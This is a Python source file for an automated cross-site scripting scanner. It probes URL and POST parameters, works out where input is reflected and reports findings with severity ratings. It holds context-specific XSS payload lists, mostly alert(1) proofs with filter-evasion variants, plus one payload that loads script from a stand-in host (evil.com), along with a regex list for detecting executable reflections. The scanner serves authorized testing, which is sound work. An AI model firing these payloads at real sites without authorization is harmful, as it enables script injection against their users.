#!/usr/bin/env python3
"""
XSS Detector - Automated Cross-Site Scripting Detection Scanner
================================================================

A comprehensive XSS detection tool that probes for reflection points,
determines injection context, and tests context-appropriate payloads.

Features:
- Multi-context detection (HTML, JavaScript, attribute, URL)
- Probe-based reflection analysis
- Context-aware payload selection
- GET and POST method support
- Proxy, header, and cookie injection
- Structured JSON output with severity ratings
- Color-coded terminal output
- Multi-threaded scanning

Usage:
    python3 xss-detector.py -u "https://target.com/search?q=test"
    python3 xss-detector.py -u "https://target.com/search" -p q,lang --context auto
    python3 xss-detector.py -u "https://target.com/comment" -m POST -d "body=test" --proxy http://127.0.0.1:8080
    python3 xss-detector.py -u "https://target.com/page?q=test" --cookies "session=abc" -o report.json

Author: Security Research Team
License: For authorized security testing only
"""

import argparse
import requests
import json
import re
import sys
import time
import hashlib
import random
import string
import threading
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict, field
from typing import Dict, List, Optional, Tuple, Any
from datetime import datetime
import warnings

warnings.filterwarnings('ignore', message='Unverified HTTPS request')

# ============================================================================
# CONFIGURATION
# ============================================================================

DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
DEFAULT_TIMEOUT = 15
DEFAULT_THREADS = 5

# ============================================================================
# TERMINAL COLORS
# ============================================================================

class Colors:
    """ANSI color codes for terminal output."""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

    @staticmethod
    def disable():
        for attr in ['RED', 'GREEN', 'YELLOW', 'BLUE', 'MAGENTA', 'CYAN', 'WHITE', 'BOLD', 'END']:
            setattr(Colors, attr, '')


class Logger:
    """Logging utility with colored output."""
    verbose = False

    @staticmethod
    def info(msg: str):
        print(f"{Colors.BLUE}[*]{Colors.END} {msg}")

    @staticmethod
    def success(msg: str):
        print(f"{Colors.GREEN}[+]{Colors.END} {msg}")

    @staticmethod
    def warning(msg: str):
        print(f"{Colors.YELLOW}[!]{Colors.END} {msg}")

    @staticmethod
    def error(msg: str):
        print(f"{Colors.RED}[-]{Colors.END} {msg}")

    @staticmethod
    def vuln(msg: str):
        print(f"{Colors.RED}{Colors.BOLD}[VULN]{Colors.END} {msg}")

    @staticmethod
    def debug(msg: str):
        if Logger.verbose:
            print(f"{Colors.CYAN}[D]{Colors.END} {msg}")


# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class ReflectionPoint:
    """Describes where and how user input is reflected."""
    parameter: str
    context: str           # html, js, attr, url, css
    location: str          # tag body, attribute value, script block, etc.
    encoding_applied: str  # none, html, url, js
    surrounding: str       # snippet of surrounding code

@dataclass
class XSSFinding:
    """A confirmed or potential XSS finding."""
    url: str
    parameter: str
    method: str
    payload: str
    context: str
    severity: str          # critical, high, medium, low, info
    confidence: str        # confirmed, high, medium, low
    evidence: str
    reflection_detail: str
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

# ============================================================================
# PAYLOAD DEFINITIONS
# ============================================================================

class PayloadLibrary:
    """Context-aware XSS payload collections."""

    # Unique canary for reflection detection
    @staticmethod
    def generate_canary() -> str:
        tag = ''.join(random.choices(string.ascii_lowercase, k=6))
        return f"xss{tag}{random.randint(1000,9999)}"

    PROBE_PAYLOADS = [
        '<xsscanary>',
        '"xsscanary',
        "'xsscanary",
        'javascript:xsscanary',
        '{{xsscanary}}',
        '${xsscanary}',
    ]

    HTML_PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<svg/onload=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<video><source onerror=alert(1)>',
        '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
        '<img src=x onerror="alert(1)">',
        '<iframe src="javascript:alert(1)">',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        '"><script>alert(1)</script>',
        '\'><script>alert(1)</script>',
    ]

    JS_PAYLOADS = [
        "'-alert(1)-'",
        '"-alert(1)-"',
        "';alert(1)//",
        '";alert(1)//',
        "\\';alert(1)//",
        '\\"};alert(1)//',
        '</script><script>alert(1)</script>',
        '$(alert(1))',
        '{{constructor.constructor("alert(1)")()}}',
        'alert(1)//',
        '-alert(1)-',
        '+alert(1)+',
        '`${alert(1)}`',
        '{alert(1)}',
        'alert`1`',
    ]

    ATTR_PAYLOADS = [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" onfocus="alert(1)" autofocus="',
        "' onfocus='alert(1)' autofocus='",
        '" onload="alert(1)',
        '" onclick="alert(1)',
        'javascript:alert(1)',
        '" style="background:url(javascript:alert(1))',
        "' onmouseover='alert(1)' x='",
        '" onmouseover="alert(1)" x="',
        '"><img src=x onerror=alert(1)>',
        "'><img src=x onerror=alert(1)>",
        '"><svg onload=alert(1)>',
        "x\" onfocus=\"alert(1)\" autofocus=\"",
    ]

    URL_PAYLOADS = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'javascript:alert(1)//',
        'java%0ascript:alert(1)',
        'java%09script:alert(1)',
        'java%0dscript:alert(1)',
        'jAvAsCrIpT:alert(1)',
        'javascript:alert`1`',
        '//evil.com/xss.js',
    ]


# ============================================================================
# CONTEXT ANALYZER
# ============================================================================

class ContextAnalyzer:
    """Determines the injection context from reflection analysis."""

    @staticmethod
    def detect_context(response_text: str, canary: str) -> List[ReflectionPoint]:
        """Analyze where the canary appears in the response and determine context."""
        reflections = []
        text = response_text

        # Find all occurrences
        idx = 0
        while True:
            pos = text.find(canary, idx)
            if pos == -1:
                break

            start = max(0, pos - 150)
            end = min(len(text), pos + len(canary) + 150)
            surrounding = text[start:end]

            context, location, encoding = ContextAnalyzer._classify_context(surrounding, canary)
            reflections.append(ReflectionPoint(
                parameter="",  # filled in by caller
                context=context,
                location=location,
                encoding_applied=encoding,
                surrounding=surrounding.replace('\n', ' ').strip()
            ))
            idx = pos + len(canary)

        return reflections

    @staticmethod
    def _classify_context(surrounding: str, canary: str) -> Tuple[str, str, str]:
        """Classify the injection context from surrounding HTML."""
        encoding = "none"

        # Check for HTML entity encoding
        html_encoded = canary.replace('<', '&lt;').replace('>', '&gt;')
        if html_encoded in surrounding and html_encoded != canary:
            encoding = "html"

        url_encoded = urllib.parse.quote(canary)
        if url_encoded in surrounding and url_encoded != canary:
            encoding = "url"

        # Determine context by examining surrounding code
        canary_pos = surrounding.find(canary)
        before = surrounding[:canary_pos]
        after = surrounding[canary_pos + len(canary):]

        # Inside a <script> block?
        script_open = before.rfind('<script')
        script_close = before.rfind('</script')
        if script_open > script_close:
            return ("js", "script_block", encoding)

        # Inside an HTML attribute?
        # Look for patterns like: attr="...CANARY..." or attr='...CANARY...'
        attr_dq = re.search(r'(\w+)\s*=\s*"[^"]*$', before)
        attr_sq = re.search(r"(\w+)\s*=\s*'[^']*$", before)

        if attr_dq:
            attr_name = attr_dq.group(1).lower()
            if attr_name in ('href', 'src', 'action', 'formaction', 'data', 'poster', 'codebase'):
                return ("url", f"attr_{attr_name}", encoding)
            if attr_name in ('style',):
                return ("css", "style_attr", encoding)
            if attr_name.startswith('on'):
                return ("js", f"event_handler_{attr_name}", encoding)
            return ("attr", f"attr_value_dq_{attr_name}", encoding)

        if attr_sq:
            attr_name = attr_sq.group(1).lower()
            if attr_name in ('href', 'src', 'action', 'formaction', 'data', 'poster', 'codebase'):
                return ("url", f"attr_{attr_name}", encoding)
            if attr_name.startswith('on'):
                return ("js", f"event_handler_{attr_name}", encoding)
            return ("attr", f"attr_value_sq_{attr_name}", encoding)

        # Inside a <style> block?
        style_open = before.rfind('<style')
        style_close = before.rfind('</style')
        if style_open > style_close:
            return ("css", "style_block", encoding)

        # Inside an HTML comment?
        comment_open = before.rfind('<!--')
        comment_close = before.rfind('-->')
        if comment_open > comment_close:
            return ("html", "comment", encoding)

        # Inside a <textarea> or similar raw text element?
        for tag in ('textarea', 'title', 'noscript', 'xmp'):
            tag_open = before.rfind(f'<{tag}')
            tag_close = before.rfind(f'</{tag}')
            if tag_open > tag_close:
                return ("html", f"raw_text_{tag}", encoding)

        # Default: HTML body context
        return ("html", "tag_body", encoding)


# ============================================================================
# XSS SCANNER ENGINE
# ============================================================================

class XSSScanner:
    """Core XSS scanning engine."""

    def __init__(self, method: str = "GET", headers: Optional[Dict] = None,
                 cookies: Optional[Dict] = None, proxy: Optional[str] = None,
                 context_mode: str = "auto", timeout: int = DEFAULT_TIMEOUT,
                 threads: int = DEFAULT_THREADS, data: Optional[Dict] = None):
        self.method = method.upper()
        self.context_mode = context_mode
        self.timeout = timeout
        self.threads = threads
        self.post_data = data or {}
        self.findings: List[XSSFinding] = []
        self.lock = threading.Lock()

        self.session = requests.Session()
        self.session.headers.update({'User-Agent': DEFAULT_USER_AGENT})
        self.session.verify = False

        if headers:
            self.session.headers.update(headers)
        if cookies:
            self.session.cookies.update(cookies)
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

    def _send_request(self, url: str, param: str, value: str) -> Optional[requests.Response]:
        """Send a request with the payload injected into the parameter."""
        try:
            if self.method == "GET":
                parsed = urllib.parse.urlparse(url)
                query = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                query[param] = [value]
                new_query = urllib.parse.urlencode(query, doseq=True)
                target = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
                return self.session.get(target, timeout=self.timeout)
            else:
                data = self.post_data.copy()
                data[param] = value
                return self.session.post(url, data=data, timeout=self.timeout)
        except requests.RequestException as e:
            Logger.debug(f"Request error for {param}={value[:40]}...: {e}")
            return None

    def detect_reflections(self, url: str, param: str) -> List[ReflectionPoint]:
        """Send a canary to detect reflection points and their contexts."""
        canary = PayloadLibrary.generate_canary()
        Logger.debug(f"Probing {param} with canary: {canary}")

        response = self._send_request(url, param, canary)
        if response is None:
            return []

        reflections = ContextAnalyzer.detect_context(response.text, canary)
        for r in reflections:
            r.parameter = param

        if reflections:
            Logger.info(f"Found {len(reflections)} reflection(s) for parameter '{param}'")
            for r in reflections:
                Logger.debug(f"  Context: {r.context} | Location: {r.location} | Encoding: {r.encoding_applied}")
        else:
            Logger.debug(f"No reflections found for parameter '{param}'")

        return reflections

    def _get_payloads_for_context(self, context: str) -> List[str]:
        """Return payloads appropriate for the detected context."""
        mapping = {
            'html': PayloadLibrary.HTML_PAYLOADS,
            'js': PayloadLibrary.JS_PAYLOADS,
            'attr': PayloadLibrary.ATTR_PAYLOADS,
            'url': PayloadLibrary.URL_PAYLOADS,
            'css': PayloadLibrary.HTML_PAYLOADS,  # fallback
        }
        return mapping.get(context, PayloadLibrary.HTML_PAYLOADS)

    def _check_payload_reflection(self, response_text: str, payload: str) -> Tuple[bool, str]:
        """Check if the payload is reflected in a potentially executable way."""
        if payload in response_text:
            # Check for common XSS indicators unencoded
            dangerous_patterns = [
                r'<script[^>]*>.*?alert',
                r'onerror\s*=',
                r'onload\s*=',
                r'onmouseover\s*=',
                r'onfocus\s*=',
                r'onclick\s*=',
                r'ontoggle\s*=',
                r'onstart\s*=',
                r'<svg[^>]*onload',
                r'<img[^>]*onerror',
                r'javascript\s*:',
                r'<iframe[^>]*src\s*=\s*["\']?javascript',
            ]
            for pattern in dangerous_patterns:
                if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
                    return True, f"Payload reflected and matches executable pattern: {pattern}"
            return True, "Payload reflected without encoding (manual verification needed)"

        # Check partial reflection
        stripped = payload.replace('"', '').replace("'", '').replace(' ', '')
        if stripped in response_text.replace('"', '').replace("'", '').replace(' ', ''):
            return False, "Payload partially reflected (attribute quote handling may differ)"

        return False, "Payload not reflected"

    def test_parameter(self, url: str, param: str) -> List[XSSFinding]:
        """Test a single parameter for XSS."""
        findings = []

        # Step 1: Detect reflections
        reflections = self.detect_reflections(url, param)
        if not reflections:
            return findings

        # Step 2: Determine which contexts to test
        for reflection in reflections:
            if reflection.encoding_applied in ('html', 'url') and reflection.context != 'js':
                Logger.debug(f"Reflection is encoded ({reflection.encoding_applied}), testing bypass payloads")

            if self.context_mode == 'auto':
                context = reflection.context
            else:
                context = self.context_mode

            payloads = self._get_payloads_for_context(context)
            Logger.info(f"Testing {len(payloads)} {context}-context payloads on '{param}'")

            # Step 3: Test payloads
            for payload in payloads:
                response = self._send_request(url, param, payload)
                if response is None:
                    continue

                reflected, evidence = self._check_payload_reflection(response.text, payload)
                if reflected:
                    severity = "high"
                    confidence = "high"
                    if "manual verification" in evidence:
                        severity = "medium"
                        confidence = "medium"

                    # Upgrade severity for confirmed executable patterns
                    if "executable pattern" in evidence:
                        severity = "critical" if context == "html" else "high"
                        confidence = "confirmed"

                    finding = XSSFinding(
                        url=url,
                        parameter=param,
                        method=self.method,
                        payload=payload,
                        context=context,
                        severity=severity,
                        confidence=confidence,
                        evidence=evidence,
                        reflection_detail=f"Context: {reflection.location}, Encoding: {reflection.encoding_applied}"
                    )
                    findings.append(finding)
                    with self.lock:
                        self.findings.append(finding)

                    Logger.vuln(
                        f"XSS in '{param}' [{severity}/{confidence}] "
                        f"Context: {context} | Payload: {payload[:60]}"
                    )

                    # After first confirmed finding in this context, skip remaining payloads
                    if confidence == "confirmed":
                        break

        return findings

    def scan(self, url: str, parameters: List[str]) -> List[XSSFinding]:
        """Scan all specified parameters for XSS."""
        Logger.info(f"Starting XSS scan on {url}")
        Logger.info(f"Method: {self.method} | Context: {self.context_mode} | Parameters: {', '.join(parameters)}")

        all_findings = []
        if self.threads > 1 and len(parameters) > 1:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = {
                    executor.submit(self.test_parameter, url, p): p for p in parameters
                }
                for future in as_completed(futures):
                    try:
                        results = future.result()
                        all_findings.extend(results)
                    except Exception as e:
                        Logger.error(f"Error testing {futures[future]}: {e}")
        else:
            for param in parameters:
                results = self.test_parameter(url, param)
                all_findings.extend(results)

        return all_findings

    def generate_report(self) -> Dict[str, Any]:
        """Generate a structured report of all findings."""
        return {
            'scan_time': datetime.now().isoformat(),
            'total_findings': len(self.findings),
            'severity_summary': {
                'critical': len([f for f in self.findings if f.severity == 'critical']),
                'high': len([f for f in self.findings if f.severity == 'high']),
                'medium': len([f for f in self.findings if f.severity == 'medium']),
                'low': len([f for f in self.findings if f.severity == 'low']),
            },
            'findings': [asdict(f) for f in self.findings],
        }


# ============================================================================
# PARAMETER EXTRACTION
# ============================================================================

def extract_parameters_from_url(url: str) -> List[str]:
    """Extract query parameter names from a URL."""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    return list(params.keys())


def parse_data_string(data_str: str) -> Dict[str, str]:
    """Parse a key=value&key=value data string."""
    return dict(urllib.parse.parse_qsl(data_str, keep_blank_values=True))


# ============================================================================
# MAIN
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='XSS Detector - Automated Cross-Site Scripting Detection Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u "https://target.com/search?q=test"
  %(prog)s -u "https://target.com/search?q=test&lang=en" -p q
  %(prog)s -u "https://target.com/search" -p q,lang --context js
  %(prog)s -u "https://target.com/comment" -m POST -d "body=test&name=user"
  %(prog)s -u "https://target.com/page?q=1" --proxy http://127.0.0.1:8080 -o findings.json
        """
    )

    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--params', help='Comma-separated parameter names to test (auto-detected from URL if omitted)')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='HTTP method (default: GET)')
    parser.add_argument('-d', '--data', help='POST data (e.g., "body=test&name=user")')
    parser.add_argument('--context', default='auto', choices=['auto', 'html', 'js', 'attr', 'url'],
                        help='Injection context mode (default: auto)')
    parser.add_argument('--headers', help='Custom headers as JSON string, e.g. \'{"X-Custom": "val"}\'')
    parser.add_argument('--cookies', help='Cookies as "name=value; name2=value2"')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--timeout', type=int, default=DEFAULT_TIMEOUT, help=f'Request timeout in seconds (default: {DEFAULT_TIMEOUT})')
    parser.add_argument('--threads', type=int, default=DEFAULT_THREADS, help=f'Number of threads (default: {DEFAULT_THREADS})')
    parser.add_argument('-o', '--output', help='Output file for JSON report')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--no-color', action='store_true', help='Disable colored output')

    args = parser.parse_args()

    if args.no_color:
        Colors.disable()

    Logger.verbose = args.verbose

    # Parse optional inputs
    headers = None
    if args.headers:
        try:
            headers = json.loads(args.headers)
        except json.JSONDecodeError:
            Logger.error("Invalid JSON for --headers")
            sys.exit(1)

    cookies = {}
    if args.cookies:
        for part in args.cookies.split(';'):
            if '=' in part:
                k, v = part.strip().split('=', 1)
                cookies[k.strip()] = v.strip()

    post_data = {}
    if args.data:
        post_data = parse_data_string(args.data)

    # Determine parameters to test
    parameters = []
    if args.params:
        parameters = [p.strip() for p in args.params.split(',')]
    elif args.method.upper() == 'GET':
        parameters = extract_parameters_from_url(args.url)
    elif post_data:
        parameters = list(post_data.keys())

    if not parameters:
        Logger.error("No parameters to test. Provide -p or include query parameters in the URL.")
        sys.exit(1)

    # Banner
    print(f"""
{Colors.CYAN}{Colors.BOLD}
 __  ______ ____    ____       _            _
 \\ \\/ / ___/ ___|  |  _ \\  ___| |_ ___  ___| |_ ___  _ __
  \\  /\\___ \\___ \\  | | | |/ _ \\ __/ _ \\/ __| __/ _ \\| '__|
  /  \\ ___) |__) | | |_| |  __/ ||  __/ (__| || (_) | |
 /_/\\_\\____/____/  |____/ \\___|\\__\\___|\\___|\\__\\___/|_|

    Automated Cross-Site Scripting Detection Scanner
{Colors.END}""")

    # Initialize scanner
    scanner = XSSScanner(
        method=args.method,
        headers=headers,
        cookies=cookies if cookies else None,
        proxy=args.proxy,
        context_mode=args.context,
        timeout=args.timeout,
        threads=args.threads,
        data=post_data if post_data else None,
    )

    # Run scan
    try:
        findings = scanner.scan(args.url, parameters)
    except KeyboardInterrupt:
        Logger.warning("Scan interrupted by user")
        findings = scanner.findings

    # Print summary
    print(f"\n{Colors.BOLD}{'=' * 65}")
    print(f"  XSS SCAN RESULTS")
    print(f"{'=' * 65}{Colors.END}")

    report = scanner.generate_report()
    summary = report['severity_summary']

    print(f"  Total Findings: {report['total_findings']}")
    if summary['critical']:
        print(f"  {Colors.RED}Critical: {summary['critical']}{Colors.END}")
    if summary['high']:
        print(f"  {Colors.RED}High:     {summary['high']}{Colors.END}")
    if summary['medium']:
        print(f"  {Colors.YELLOW}Medium:   {summary['medium']}{Colors.END}")
    if summary['low']:
        print(f"  {Colors.CYAN}Low:      {summary['low']}{Colors.END}")

    if findings:
        print(f"\n{Colors.BOLD}  Findings Detail:{Colors.END}")
        for i, f in enumerate(findings, 1):
            sev_color = {
                'critical': Colors.RED,
                'high': Colors.RED,
                'medium': Colors.YELLOW,
                'low': Colors.CYAN,
            }.get(f.severity, Colors.WHITE)

            print(f"\n  {Colors.BOLD}--- Finding #{i} ---{Colors.END}")
            print(f"  Severity:   {sev_color}{f.severity.upper()}{Colors.END}")
            print(f"  Confidence: {f.confidence}")
            print(f"  Parameter:  {f.parameter}")
            print(f"  Context:    {f.context}")
            print(f"  Payload:    {f.payload}")
            print(f"  Evidence:   {f.evidence}")
            print(f"  Detail:     {f.reflection_detail}")
    else:
        print(f"\n  {Colors.GREEN}No XSS vulnerabilities detected.{Colors.END}")

    print(f"\n{'=' * 65}\n")

    # Save report
    if args.output:
        with open(args.output, 'w') as fp:
            json.dump(report, fp, indent=2)
        Logger.success(f"Report saved to: {args.output}")

    sys.exit(1 if findings else 0)


if __name__ == '__main__':
    main()
